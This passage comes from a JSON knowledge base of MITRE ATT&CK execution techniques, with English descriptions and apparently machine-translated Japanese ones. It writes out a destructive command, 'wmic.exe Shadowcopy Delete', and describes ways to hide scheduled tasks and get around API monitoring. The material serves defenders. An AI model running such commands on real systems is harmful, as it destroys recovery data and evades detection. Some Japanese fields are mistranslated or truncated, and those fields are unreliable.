                "description_eng": "Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems.(Citation: WMI 1-3) WMI is an administration feature that provides a uniform environment to access Windows system components.\n\nThe WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).(Citation: WMI 1-3) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: WMI 1-3) (Citation: Mandiant WMI)\n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for [Discovery](https://attack.mitre.org/tactics/TA0007) as well as [Execution](https://attack.mitre.org/tactics/TA0002) of commands and payloads.(Citation: Mandiant WMI) For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)).(Citation: WMI 6)\n\n**Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being “disabled by default” on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by [PowerShell](https://attack.mitre.org/techniques/T1059/001) as the primary WMI interface.(Citation: WMI 7,8) In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.(Citation: WMI 7,8)",
                "description_jp": "攻撃者は、悪意のあるコマンドやペイロードを実行するために、Windows Management Instrumentation (WMI)を悪用する可能性がある。WMIはプログラマー向けに設計されており、Windowsシステム上の管理データと操作のためのインフラストラクチャである(引用：WMI 1-3) WMIは、Windowsシステムコンポーネントにアクセスするための統一された環境を提供する管理機能である。\n\nWMIサービスはローカルとリモートの両方のアクセスを可能にするが、後者は[Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003)や[Windows Remote Management](https://attack.mitre.org/techniques/T1021/006)などの[Remote Services](https://attack.mitre.org/techniques/T1021)によって促進される。(引用：WMI 1-3) DCOM経由のリモートWMIはポート135を使用して動作するが、WinRM経由のWMIはHTTPを使用する場合はポート5985、HTTPSの場合はポート5986を使用して動作する。(引用：WMI 1-3) (引用：Mandiant WMI)\n\n敵対者は、WMI を使用してローカルおよびリモートのシステムと対話し、コマンドやペイロードの [実行](https://attack.mitre.org/tactics/TA0002) だけでなく、[発見](https://attack.mitre.org/tactics/TA0007) のための情報収集など、さまざまな動作を実行する手段として使用できます(引用: Mandiant WMI)。たとえば、`wmic.exe` を悪用して、`wmic.exe Shadowcopy Delete` (すなわち、[システム回復の禁止](https://attack.mitre.org/techniques/T1490) というコマンドでシャドウコピーを削除することができます(引用: WMI 6)。\n\n**Note:** `wmic.exe` は2024年1月をもって非推奨となり、Windows 11+ではWMIC機能は「デフォルトで無効」となる。WMICは、それ以降のWindowsのリリースから削除され、主要なWMIインターフェースとして[PowerShell](https://attack.mitre.org/techniques/T1059/001)に置き換えられます(引用: WMI 7,8) PowerShellや`wbemtool.exe`のようなツールに加えて、COM APIもC++、.NET、VBScriptなどを介してプログラムでWMIと対話するために使用することができます(引用: WMI 7,8)",
                "subtechniques": []
            },
            {
                "id": "T1129",
                "name_eng": "Shared Modules",
                "name_jp": "共有モジュール",
                "description_eng": "Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., [Native API](https://attack.mitre.org/techniques/T1106)).\n\nAdversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.\n\nThe Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in `dlfcn.h` in functions such as `dlopen` and `dlsym`. Although macOS can execute `.so` files, common practice uses `.dylib` files.(Citation: Apple Dev Dynamic Libraries)(Citation: Linux Shared Libraries)(Citation: RotaJakiro 2021 netlab360 analysis)(Citation: Unit42 OceanLotus 2017)\n\nThe Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in `NTDLL.dll` and is part of the Windows [Native API](https://attack.mitre.org/techniques/T1106) which is called from functions like `LoadLibrary` at run time.(Citation: Microsoft DLL)",
                "description_jp": "攻撃者は、共有モジュールをロードすることで、悪意のあるペイロードを実行する可能性があります。共有モジュールは、特定のカスタム関数や OS API 関数（[Native API](https://attack.mitre.org/techniques/T1106)など）の呼び出しなど、再利用可能なコードへのアクセスを提供するためにプロセスにロードされる実行可能ファイルです。\n\n攻撃者はこの機能を、被害者システム上で任意のペイロードを実行する手段として使用する可能性があります。例えば、敵対者はマルウェアの機能をモジュール化し、C2ネットワーク通信の管理や目的に対する特定のアクションの実行など、さまざまな機能を実行する共有オブジェクトにすることができます。\n\nLinuxとmacOSのモジュールローダーは、任意のローカルパスから共有オブジェクトをロードして実行することができます。この機能は `dlfcn.h` の `dlopen` や `dlsym` といった関数に存在する。macOSは`.so`ファイルを実行できるが、一般的には`.dylib`ファイルを使用する。(引用：Apple Dev Dynamic Libraries)(引用：Linux Shared Libraries)(引用：RotaJakiro 2021 netlab360解析)(引用：Unit42 OceanLotus 2017)\n\nWindowsのモジュールローダーは、任意のローカルパスや任意のUNC（Universal Naming Convention）ネットワークパスからDLLをロードするように指示することができる。この機能は`NTDLL.dll`に存在し、Windowsの[Native API](https://attack.mitre.org/techniques/T1106)の一部であり、実行時に`LoadLibrary`などの関数から呼び出される(引用: Microsoft DLL)",
                "subtechniques": []
            },
            {
                "id": "T1675",
                "name_eng": "ESXi Administration Command",
                "name_jp": "ESXi管理コマンド",
                "description_eng": "Adversaries may abuse ESXi administration services to execute commands on guest machines hosted within an ESXi virtual environment. Persistent background services on ESXi-hosted VMs, such as the VMware Tools Daemon Service, allow for remote management from the ESXi server. The tools daemon service runs as `vmtoolsd.exe` on Windows guest operating systems, `vmware-tools-daemon` on macOS, and `vmtoolsd ` on Linux.(Citation: Broadcom VMware Tools Services) \n\nAdversaries may leverage a variety of tools to execute commands on ESXi-hosted VMs – for example, by using the vSphere Web Services SDK to programmatically execute commands and scripts via APIs such as `StartProgramInGuest`, `ListProcessesInGuest`,  `ListFileInGuest`, and `InitiateFileTransferFromGuest`.(Citation: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)(Citation: Broadcom Running Guest OS Operations) This may enable follow-on behaviors on the guest VMs, such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083), [Data from Local System](https://attack.mitre.org/techniques/T1005), or [OS Credential Dumping](https://attack.mitre.org/techniques/T1003).",
                "description_jp": "攻撃者は、ESXi管理サービスを悪用して、ESXi仮想環境内でホストされているゲストマシン上でコマンドを実行する可能性があります。VMware Tools Daemon Serviceのような、ESXiがホストするVM上の永続的なバックグラウンドサービスは、ESXiサーバからのリモート管理を可能にします。ツール・デーモン・サービスは、Windows ゲスト・オペレーティング・システムでは `vmtoolsd.exe`、macOS では `vmware-tools-daemon`、Linux では `vmtoolsd ` として実行される（引用：Broadcom VMware Tools Services）。\n\n例えば、vSphere Web Services SDK を使用して、`StartProgramInGuest`、`ListProcessesInGuest`、`ListFileInGuest`、`InitiateFileTransferFromGuest` などの API を介してコマンドやスクリプトをプログラムで実行します。(引用: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)(引用: Broadcom Running Guest OS Operations) これにより、[File and Directory Discovery](https://attack.mitre.org/techniques/T1083)、[Data from Local System](https://attack.mitre.org/techniques/T1005)、[OS Credential Dumping](https://attack.mitre.org/techniques/T1003)など、ゲスト VM 上での後続動作が有効になる可能性があります。",
                "subtechniques": []
            },
            {
                "id": "T1053",
                "name_eng": "Scheduled Task/Job",
                "name_jp": "スケジュールされたタスク/ジョブ",
                "description_eng": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.(Citation: TechNet Task Scheduler Security)\n\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.(Citation: ProofPoint Serpent)",
                "description_jp": "攻撃者は、タスク・スケジューリング機能を悪用し、悪意あるコードの初回実行や反復実行を容易にする可能性がある。すべての主要なオペレーティング・システムには、指定した日時に実行されるプログラムやスクリプトをスケジュールするユーティリティが存在する。タスクは、適切な認証（例：Windows環境におけるRPCとファイルとプリンタの共有）を満たせば、リモートシステム上でスケジュールすることもできる。リモートシステム上でタスクをスケジューリングするには、通常、リモートシステムの管理者またはその他の特権グループのメンバーである必要があります。\n\n攻撃者は、タスクスケジューリングを使って、システム起動時や、永続化のためにスケジュールされたベースでプログラムを実行することができる。これらのメカニズムは、指定されたアカウント(昇格した権限/特権を持つアカウントなど)のコンテキストでプロセスを実行するために悪用されることもあります。また、[System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218)と同様に、敵対者はタスクスケジューリングを悪用して、信頼されたシステムプロセスの下で1回限りの実行を隠蔽する可能性もある(引用：ProofPoint Serpent)。",
                "subtechniques": [
                    {
                        "id": "T1053.003",
                        "name_eng": "Cron",
                        "name_jp": "クロン",
                        "description_eng": "Adversaries may abuse the <code>cron</code> utility to perform task scheduling for initial or recurring execution of malicious code.(Citation: 20 macOS Common Tools and Techniques) The <code>cron</code> utility is a time-based job scheduler for Unix-like operating systems.  The <code> crontab</code> file contains the schedule of cron entries to be run and the specified times for execution. Any <code>crontab</code> files are stored in operating system-specific file paths.\n\nAn adversary may use <code>cron</code> in Linux or Unix environments to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). In ESXi environments, cron jobs must be created directly via the crontab file (e.g., `/var/spool/cron/crontabs/root`).(Citation: CloudSEK ESXiArgs 2023)",
                        "description_jp": "攻撃者は<code>cron</code>ユーティリティを悪用して、悪意のあるコードを初回または繰り返し実行するためのタスクスケジューリングを行う可能性がある。(引用：20 macOS Common Tools and Techniques) <code>cron</code>ユーティリティは、Unix系OS向けの時間ベースのジョブスケジューラである。  <code> crontab</code> ファイルには、実行される cron エントリのスケジュールと、指定された実行時間が含まれています。<code>crontab</code> ファイルはオペレーティングシステム固有のファイルパスに格納される。\n\n敵対者は Linux または Unix 環境で <code>cron</code> を使用して、システム起動時または [Persistence](https://attack.mitre.org/tactics/TA0003) のスケジュールベースでプログラムを実行する可能性があります。ESXi環境では、cronジョブはcrontabファイル(例えば、`/var/spool/cron/crontabs/root`)を介して直接作成する必要があります(引用: CloudSEK ESXiArgs 2023)。"
                    },
                    {
                        "id": "T1053.005",
                        "name_eng": "Scheduled Task",
                        "name_jp": "予定タスク",
                        "description_eng": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel.(Citation: Stack Overflow) In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) (WMI) to create a scheduled task. Adversaries may also utilize the Powershell Cmdlet `Invoke-CimMethod`, which leverages WMI class `PS_ScheduledTask` to create a scheduled task via an XML path.(Citation: Red Canary - Atomic Red Team)\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.(Citation: ProofPoint Serpent)\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).(Citation: SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.(Citation: Defending Against Scheduled Task Attacks in Windows Environments)",
                        "description_jp": "攻撃者はWindowsタスクスケジューラを悪用し、悪意のあるコードを初回または繰り返し実行するためのタスクスケジューリングを実行する可能性がある。Windowsのタスクスケジューラーにアクセスする方法は複数ある。schtasks](https://attack.mitre.org/software/S0111)ユーティリティは、コマンドラインで直接実行することができ、タスクスケジューラは、コントロールパネルの管理者ツールセクション内のGUIを介して開くことができます(引用: Stack Overflow)いくつかのケースでは、敵対者は、Windowsタスクスケジューラのための.NETラッパーを使用しており、代わりに、敵対者は、スケジュールされたタスクを作成するためにWindows netapi32ライブラリと[Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)(WMI)を使用しています。敵はまた、XMLパスを介してスケジュールされたタスクを作成するために、WMIクラス`PS_ScheduledTask`を活用するPowershell Cmdlet `Invoke-CimMethod`を利用するかもしれない(引用: Red Canary - Atomic Red Team)。\n\n敵対者は Windows タスク・スケジューラを使用して、システム起動時または永続化のためにスケジュールされたベース でプログラムを実行する可能性がある。Windows タスクスケジューラは、横移動の一部としてリモート実行を行ったり、指定されたアカウント(SYSTEM など)のコンテキスト下でプロセスを実行したりするために悪用される可能性もあります。System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218)と同様に、敵対者は Windows タスクスケジューラーを悪用して、署名された/信頼されたシステムプロセスの下で 1 回限りの実行をマスクする可能性もあります。\n\n敵対者はまた、防御ツールやタスクの列挙に使用される手動クエリには見えない「隠された」スケジュールタスク(すなわち[Hide Artifacts](https://attack.mitre.org/techniques/T1564))を作成する可能性があります。具体的には、敵は関連するセキュリティ記述子(SD)のレジストリ値を削除することで、`schtasks /query`とタスクスケジューラからタスクを隠すことができる(この値の削除はSYSTEM権限を使用して完了しなければならない)(引用：SigmaHQ)(引用：Tarraskスケジュールタスク) 敵はまた、関連するレジストリキー内のメタデータ(例えば、`Index`値)を変更するような、タスクを隠すための別の方法を採用することができる(引用：Defending Against Scheduled Task Attacks in Windows Environments)。"
                    },
                    {
                        "id": "T1053.006",
                        "name_eng": "Systemd Timers",
                        "name_jp": "Systemd タイマー",
                        "description_eng": "Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension <code>.timer</code> that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to [Cron](https://attack.mitre.org/techniques/T1053/003) in Linux environments.(Citation: archlinux Systemd Timers Aug 2020) Systemd timers may be activated remotely via the <code>systemctl</code> command line utility, which operates over [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: Systemd Remote Control)\n\nEach <code>.timer</code> file must have a corresponding <code>.service</code> file with the same name, e.g., <code>example.timer</code> and <code>example.service</code>. <code>.service</code> files are [Systemd Service](https://attack.mitre.org/techniques/T1543/002) unit files that are managed by the systemd system and service manager.(Citation: Linux man-pages: systemd January 2014) Privileged timers are written to <code>/etc/systemd/system/</code> and <code>/usr/lib/systemd/system</code> while user level are written to <code>~/.config/systemd/user/</code>.\n\nAn adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence.(Citation: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(Citation: gist Arch package compromise 10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018) Timers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence.(Citation: Falcon Sandbox smp: 28553b3a9d)",
                        "description_jp": "攻撃者は systemd タイマーを悪用して、悪意のあるコードを初期または繰り返し実行するためのタスクスケジューリングを行う可能性があります。Systemd タイマーは <code>.timer</code> という拡張子を持つユニットファイルで、サービスを制御します。タイマーはカレンダーのイベントや、開始点からの相対的な時間経過後に実行されるように設定できます。Linux 環境では、[Cron](https://attack.mitre.org/techniques/T1053/003) の代替として使うことができます。(引用: archlinux Systemd Timers Aug 2020) Systemd タイマーは、[SSH](https://attack.mitre.org/techniques/T1021/004) 経由で動作する <code>systemctl</code> コマンドラインユーティリティを使ってリモートで起動することができます。(引用: Systemd Remote Control)\n\n各 <code>.timer</code> ファイルには、対応する同じ名前の <code>.service</code> ファイルが必要です。例えば、<code>example.timer</code> と <code>example.service</code> のようになります。<code>.service</code>ファイルは[Systemd Service](https://attack.mitre.org/techniques/T1543/002)ユニットファイルで、systemdシステムとサービスマネージャーによって管理されます。(引用: Linux man-pages: systemd January 2014) 特権タイマーは<code>/etc/systemd/system/</code>と<code>/usr/lib/systemd/system</code>に、ユーザーレベルは<code>~/.config/systemd/user/</code>に書き込まれます。\n\n敵対者は systemd タイマーを使ってシステム起動時やスケジュールベースで悪意のあるコードを実行し、永続化する可能性があります。(引用: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(Citation: gist Arch package compromise 10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018) 特権パスを使ってインストールされたタイマーはルートレベルの永続化を維持するために使われるかもしれません。攻撃者はまた、ユーザーレベルの持続性を達成するためにユーザーレベルのタイマーをインストールする可能性があります。(引用: Falcon Sandbox smp: 28553b3a9d)"
                    },
                    {
                        "id": "T1053.007",
                        "name_eng": "Container Orchestration Job",
                        "name_jp": "コンテナ・オーケストレーションの仕事",
                        "description_eng": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
                        "description_jp": "攻撃者は、Kubernetesなどのコンテナオーケストレーションツールが提供するタスクスケジューリング機能を悪用して、悪意のあるコードを実行するように設定されたコンテナのデプロイをスケジュールする可能性があります。コンテナオーケストレーションジョブは、Linuxシステムのcronジョブと同様に、特定の日時にこれらの自動タスクを実行します。この種のデプロイは、長期にわたってコンテナの量を維持するように構成することもでき、クラスタ内の永続性を維持するプロセスを自動化することができます。\n\nKubernetesでは、CronJobは、特定のタスクを実行するために1つまたは複数のコンテナを実行するJobをスケジュールするために使用されることがあります（引用：Kubernetes Jobs）（引用：Kubernetes CronJob）したがって、敵対者は、クラスタ内のさまざまなノードで悪意のあるコードを実行するJobのデプロイをスケジュールするためにCronJobを利用する可能性があります（引用：Threat Matrix for Kubernetes）。"
                    },
                    {
                        "id": "T1053.002",
                        "name_eng": "At",
                        "name_jp": "で",
                        "description_eng": "Adversaries may abuse the [at](https://attack.mitre.org/software/S0110) utility to perform task scheduling for initial or recurring execution of malicious code. The [at](https://attack.mitre.org/software/S0110) utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of [Scheduled Task](https://attack.mitre.org/techniques/T1053/005)'s [schtasks](https://attack.mitre.org/software/S0111) in Windows environments, using [at](https://attack.mitre.org/software/S0110) requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. In addition to explicitly running the `at` command, adversaries may also schedule a task with [at](https://attack.mitre.org/software/S0110) by directly leveraging the [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) `Win32_ScheduledJob` WMI class.(Citation: Malicious Life by Cybereason)\n\nOn Linux and macOS, [at](https://attack.mitre.org/software/S0110) may be invoked by the superuser as well as any users added to the <code>at.allow</code> file. If the <code>at.allow</code> file does not exist, the <code>at.deny</code> file is checked. Every username not listed in <code>at.deny</code> is allowed to invoke [at](https://attack.mitre.org/software/S0110). If the <code>at.deny</code> exists and is empty, global use of [at](https://attack.mitre.org/software/S0110) is permitted. If neither file exists (which is often the baseline) only the superuser is allowed to use [at](https://attack.mitre.org/software/S0110).(Citation: Linux at)\n\nAdversaries may use [at](https://attack.mitre.org/software/S0110) to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). [at](https://attack.mitre.org/software/S0110) can also be abused to conduct remote [Execution](https://attack.mitre.org/tactics/TA0002) as part of [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or to run a process under the context of a specified account (such as SYSTEM).\n\nIn Linux environments, adversaries may also abuse [at](https://attack.mitre.org/software/S0110) to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, [at](https://attack.mitre.org/software/S0110) may also be used for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) if the binary is allowed to run as superuser via <code>sudo</code>.(Citation: GTFObins at)",
                        "description_jp": "攻撃者は[at](https://attack.mitre.org/software/S0110)ユーティリティを悪用して、悪意のあるコードを初回または繰り返し実行するためのタスクスケジューリングを実行する可能性があります。at](https://attack.mitre.org/software/S0110)ユーティリティは、Windows、Linux、および macOS 内に実行可能ファイルとして存在し、指定した日時にタスクをスケジューリングします。Windows環境では[Scheduled Task](https://attack.mitre.org/techniques/T1053/005)の[schtasks](https://attack.mitre.org/software/S0111)に取って代わられ、非推奨となっていますが、[at](https://attack.mitre.org/software/S0110)を使用するには、タスクスケジューラサービスが起動しており、ユーザがローカルのAdministratorsグループのメンバーとしてログオンしている必要があります。明示的に `at` コマンドを実行するだけでなく、[Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) の `Win32_ScheduledJob` WMI クラスを直接利用して、[at](https://attack.mitre.org/software/S0110) でタスクをスケジュールすることもできる。(引用：Malicious Life by Cybereason)\n\nLinuxとmacOSでは、[at](https://attack.mitre.org/software/S0110)は<code>at.allow</code>ファイルに追加されたユーザーだけでなく、スーパーユーザーからも呼び出される可能性があります。<code>at.allow</code>ファイルが存在しない場合、<code>at.deny</code>ファイルがチェックされる。<code>at.deny</code>にリストされていないすべてのユーザー名は、[at](https://attack.mitre.org/software/S0110)の起動を許可される。<code>at.deny<//code>が存在し、空であれば、[at](https://attack.mitre.org/software/S0110)のグローバルな使用が許可される。どちらのファイルも存在しない場合(これがベースラインであることが多い)、スーパーユーザーだけが[at](https://attack.mitre.org/software/S0110)の使用を許可される。(引用: Linux at)\n\n攻撃者は[at](https://attack.mitre.org/software/S0110)を使用して、システム起動時または[Persistence](https://attack.mitre.org/tactics/TA0003)のスケジュールベースでプログラムを実行することができる。[at](https://attack.mitre.org/software/S0110)はまた、[Lateral Movement](https://attack.mitre.org/tactics/TA0008)の一部としてリモートで[Execution](https://attack.mitre.org/tactics/TA0002)を実行したり、指定されたアカウント(SYSTEMなど)のコンテキストでプロセスを実行するために悪用される可能性があります。\n\nLinux 環境では、タスクを使って対話的なシステムシェルを起動したり、システムコマンドを実行したりすることで、制限された環境から抜け出すために [at](https://attack.mitre.org/software/S0110) を悪用することもできる。同様に、[at](https://attack.mitre.org/software/S0110) は、<code>sudo</code> によってバイナリがスーパーユーザとして実行されることが許可されている場合、[特権の昇格](https://attack.mitre.org/tactics/TA0004) にも使用される可能性がある。(引用: GTFObins at)"
                    }
                ]
            },
            {
                "id": "T1106",
                "name_eng": "Native API",
                "name_jp": "ネイティブAPI",
                "description_eng": "Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.(Citation: NT API Windows)(Citation: Linux Kernel API) These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\n\nNative API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries.(Citation: OutFlank System Calls)(Citation: CyberBit System Calls)(Citation: MDSec System Calls) For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes.(Citation: Microsoft CreateProcess)(Citation: GNU Fork) This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.(Citation: Microsoft Win32)(Citation: LIBC)(Citation: GLIBC)\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.(Citation: Microsoft NET)(Citation: Apple Core Services)(Citation: MACOS Cocoa)(Citation: macOS Foundation)\n\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks.(Citation: Redops Syscalls) Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001).",
                "description_jp": "攻撃者は、OSのネイティブ・アプリケーション・プログラミング・インターフェース（API）と相互作用し、動作を実行する可能性がある。ネイティブAPIは、ハードウェア/デバイス、メモリ、プロセスなど、カーネル内の低レベルのOSサービスを呼び出すための制御された手段を提供する（引用：NT API Windows）（引用：Linux Kernel API）これらのネイティブAPIは、システムブート時（他のシステムコンポーネントがまだ初期化されていない時）や、ルーチン操作中のタスクやリクエストの実行時にOSによって活用される。\n\n攻撃者はこれらの OS API 機能を、動作を実行する手段として悪用する可能性があります。Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)と同様に、ネイティブAPIとそのインターフェースの階層は、被害を受けているシステムの様々なコンポーネントと相互作用し、利用するためのメカニズムを提供します。\n\nネイティブ API 関数（<code>NtCreateProcess</code> など）は、システムコール/システムコールを介して呼び出されることもありますが、これらの機能は多くの場合、インターフェースやライブラリを介してユーザーモードアプリケーションにも公開されます。(引用: OutFlank システムコール)(引用: CyberBit システムコール)(引用: MDSec システムコール) 例えば、Windows API <code>CreateProcess()</code> や GNU <code>fork()</code> のような関数は、プログラムやスクリプトが他のプロセスを開始できるようにします。(引用: Microsoft CreateProcess)(引用: GNU Fork) これは、API呼び出し元がバイナリを実行したり、CLIコマンドを実行したり、モジュールをロードしたりすることを可能にするかもしれません。(引用: Microsoft Win32)(引用: LIBC)(引用: GLIBC)\n\nMicrosoft .NETやmacOS Cocoaのような、より高度なソフトウェアフレームワークも、ネイティブAPIと相互作用するために利用可能です。これらのフレームワークは通常、API機能に対する言語ラッパー/抽象化を提供し、コードの使いやすさ/移植性を考慮して設計されています。(引用: Microsoft NET)(Citation: Apple Core Services)(Citation: MACOS Cocoa)(Citation: macOS Foundation)\n\n(引用: Redops Syscalls) 敵対者はまた、[Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)を介して監視された関数のフックを解除するなど、API監視に関連するセンサーや防御ツールを改ざんしようとする可能性がある。",
                "subtechniques": []
            },
            {
                "id": "T1610",
                "name_eng": "Deploy Container",
                "name_jp": "コンテナのデプロイ",
                "description_eng": "Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment. In Kubernetes environments, an adversary may attempt to deploy a privileged or vulnerable container into a specific node in order to [Escape to Host](https://attack.mitre.org/techniques/T1611) and access other containers running on the node. (Citation: AppSecco Kubernetes Namespace Breakout 2020)\n\nContainers can be deployed by various means, such as via Docker's <code>create</code> and <code>start</code> APIs or via a web application such as the Kubernetes dashboard or Kubeflow. (Citation: Docker Containers API)(Citation: Kubernetes Dashboard)(Citation: Kubeflow Pipelines) In Kubernetes environments, containers may be deployed through workloads such as ReplicaSets or DaemonSets, which can allow containers to be deployed across multiple nodes.(Citation: Kubernetes Workload Management) Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime.(Citation: Aqua Build Images on Hosts)",
                "description_jp": "敵対者は、実行を容易にしたり防御を回避したりするために、コンテナを環境に配備することがある。場合によっては、マルウェアを実行したりダウンロードしたりするプロセスなど、特定のイメージや配備に関連するプロセスを実行するために、敵が新しいコンテナを配備することがある。また、敵対者は、環境内の既存の防御を回避するために、ネットワークルールやユーザー制限などなしに構成された新しいコンテナをデプロイする場合もあります。Kubernetes環境では、敵対者が[Escape to Host](https://attack.mitre.org/techniques/T1611)を行い、そのノード上で実行されている他のコンテナにアクセスするために、特権コンテナや脆弱なコンテナを特定のノードにデプロイしようとする可能性があります。(引用：AppSecco Kubernetes Namespace Breakout 2020)\n\nコンテナは、Dockerの<code>create</code>や<code>start</code> API経由や、KubernetesダッシュボードやKubeflowなどのWebアプリケーション経由など、さまざまな手段でデプロイできる。(引用: Docker Containers API)(引用: Kubernetes Dashboard)(引用: Kubeflow Pipelines) Kubernetes環境では、ReplicaSetsやDaemonSetsなどのワークロードを介してコンテナがデプロイされることがあります。(引用: Kubernetes Workload Management) 敵は、取得またはビルドされた悪意のあるイメージに基づいて、または実行時に悪意のあるペイロードをダウンロードして実行する良性のイメージから、コンテナをデプロイする可能性があります。(引用: Aqua Build Images on Hosts)",
                "subtechniques": []
            },
            {
                "id": "T1674",
                "name_eng": "Input Injection",
                "name_jp": "インプット・インジェクション",
